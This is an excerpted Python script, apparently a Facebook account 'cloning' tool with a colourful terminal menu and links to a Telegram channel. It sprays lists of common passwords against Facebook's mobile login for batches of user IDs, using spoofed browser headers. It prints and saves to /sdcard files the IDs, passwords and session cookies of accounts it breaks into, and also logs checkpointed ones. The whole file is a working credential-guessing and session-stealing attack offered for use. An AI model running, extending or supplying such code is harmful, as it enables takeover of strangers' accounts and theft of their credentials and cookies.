...
time.sleep(2)
os.system(f'xdg-open-https://t.me/Y_wpp')
logo = ("""\033[1;31m
  _  __   _   ___    _   __  __ 
 | |/ /  /_\ | _ \  /_\ |  \/  |
 | ' <  / _ \|   / / _ \| |\/| |
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        print('\x1b[1;91m [1] \033[1;31mFile cloning\n ')
                        linex()
                        xd=input(' Choose > ')
                        if xd in ['1','01']:
                                ...
                                clear()
                                linex()
                                print('\x1b[1;93m 1. \x1b[1;92mMETHODE Lod \n \x1b[1;93m2. \x1b[1;92mMETHOD New \n\x1b[1;93m 3. \x1b[1;92mMETHODE lode \n\x1b[1;93m 4. \x1b[1;92mMETHODE Mix')
                                linex()
                                mthd=input('\x1b[1;97m Choose: ')
                                plist = []
                                clear()
                                linex()
                                print(' \033[0;1m[ \033[31;1m1 \033[0;1m] 𝐕𝐈𝐏 - Auto  ')
                                print(' \033[0;1m[ \033[31;1m2 \033[0;1m] 𝐕𝐈𝐏 - Manual ')
                                ...
                                if ppp in ['1','01']:
                                    ...
                                    plist.append('lovelove')
                                    plist.append('0998877665544332211')
                                    plist.append('102030405060708090')
                                    plist.append('09870987')
                                    plist.append('zzxxccvvbbnnmm')
                                    plist.append('1234qwer')
                                    plist.append('07820782')
                                    plist.append('123456A')
                                ...
                                os.system(f'xdg-open https://t.me/Y_wpp');menu()
                        elif xd in ['7','07']:
                                crack()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://t.me/Y_wpp');menu()
                        elif xd in ['9','09']:
                                sep()  
                        elif xd in ['10','10']:
                                double()                              
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;36mVIP\033[1;37m] \033[1;37m[\033[1;31m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[2;32m] \033[2;32m[\033[2;32m%s%%\033[2;32m]\033[2;32m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in ASX:
                                print('\33[1;92m[VIP-OK] '+ids+' | '+pas+'\33[0;97m')
                                print("\033[1;92m[•] Cookie: "+coki)
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/VIP-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/VIP-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\33[1;93m[VIP-CP] '+ids+' | '+pas+'\33[0;97m')
                                        open('/sdcard/VIP-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
    ...
    'dpr': '3',
    'origin': 'https://d.facebook.com',
    'referer': 'https://d.facebook.com/login/?email=jdndndndndnfn&li=0IN1ZTFPng3uxXyWVFvgEJMv&e=1647001&shbl=1&refsrc=deprecated&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?0',
...
def api1(ids,names,passlist):
    ...
    'dpr': '3',
    'origin': 'https://d.facebook.com',
    'referer': 'https://d.facebook.com/login/?email=jdndndndndnfn&li=CIV1ZWtdiug8wT66iIcpZm2T&e=1647001&shbl=1&refsrc=deprecated&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?0',
    ...
    'viewport-width': '980',
                        ...
                        ASX=str(session.cookies)
                        if "c_user" in ASX:
                                print('\33[1;92m[جار فحص-OK] '+ids+' | '+pas+'\33[0;97m')
                                print("\033[1;92m[•] Cookie: "+coki)
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/VIP-COOKIE.txt','a').write(coki+'\n')
...
def api3(ids,names,passlist):
    ...
    'dpr': '3',
    'origin': 'https://d.facebook.com',
    'referer': 'https://d.facebook.com/login/?email=jdndndndndnfn&li=Hop1ZXiGcxT_Z1YevNvaeKZm&e=1647001&shbl=1&refsrc=deprecated&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?0',
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [VIP-OK] '+str(uid)+' | '+pas+'\033[1;97m')                                        
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [VIP-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/VIP-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
